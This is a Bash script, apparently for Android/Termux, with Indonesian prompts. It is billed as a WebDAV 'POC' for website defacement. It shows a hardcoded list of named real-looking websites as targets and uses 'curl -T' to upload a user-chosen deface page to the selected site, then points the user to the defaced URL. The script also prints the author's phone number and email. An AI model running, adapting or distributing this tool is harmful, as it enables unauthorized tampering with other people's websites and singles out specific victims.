#!/bin/bash

#CodedBy Mr.Eror121
#POC WEBDAV
#SUBSCRIBE

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

clear
cd /sdcard
figlet -f pagga POC WEBDAV | lolcat
      
      echo""
      echo $bi"  _____________________"
      echo $bi" /                    /"$bi"|" $me" contacts: 082223854408"
      echo $bi"/____________________/"$bi" |" $pu" ========================"
      echo $bi"|" $ku"•Author: MR EROR121•" $bi"|" $bi"|" $me" Me:handikarohman06@@gmail.com"
      echo $bi"|====================|"$bi" |" $pu" ========================"
      echo $bi"|" $ku"Thanks To MR EROR121"$bi"|"$bi" |" $me" FB: why you "
      echo $bi"|________|°|°|_______|"$bi"/" $pu"  ========================"
      echo ""
      echo $me"              ["$ku"-"$me"]"$cy"HAPPY DEFACE"$me"["$ku"-"$me"]"
echo ""
echo $ku "*note:"
echo $me"|========================================|"
echo $me"|"$i"Script Deface Harus Di letakan di Sdcard"$me"|"
echo $me"|"$i"Dan Jangan Di Masukan Ke Folder Apapun"  $me "|"
echo $me"|========================================|"
echo ""
echo -n $ku"NAMA SCRIPT DEFACENYA SAYANK?:" 
read sc
echo ""
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $"CTRL+C Detected😢, Trying To Exit" | lolcat
echo ""
echo $" Byee,see you Sayang 😗" | lolcat
sleep 1 
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo $me"["$ku"1"$me"]" $pu"Belum Punya Target";
echo $me"[============"$pu"=============]"
echo $me"["$ku"2"$me"]" $pu"Sudah Punya Target";
echo ""
echo    "╭─JAWAB MANIS:" |lolcat
read -p "╰─#" pil;

case $pil in
1)echo ""
echo $pu"List Target:"
echo $pu"==========================="
echo $me"
http://contsol.co.za
http://colourfactory.co.za
http://scnc.co.za
http://windmillsandporcupines.co.za
http://cblandscapes.co.z
http://naturaleyeimages.com
http://bitsandpieces.co.za
http://infussion.co.za
http://thepremiummakers.com
http://mocosi.co.za
http://itsengineering.co.za
http://handj.co.za
http://ayk.co.za
http://holotropicbreathwork.co.za
http://foodconsult.co.za
http://daretogowildafrica.co.za
http://hybriddevelopments.co.za
"

echo ""
echo $pu"==========================="
echo -n $i"Masukan Salah Satu Target:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Silakan Di Cek di $cy $tg/$sc" 
echo $me"========================================"

exit

;;


2)echo -n $i"Masukan Target:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Silakan Di Cek di $cy $tg/$sc" 
echo $me"========================================"

exit

;;


*) echo " PERTAHANKAN YANG ADA JANGAN DITINGGALKAN " | lolcat
esac
done
done
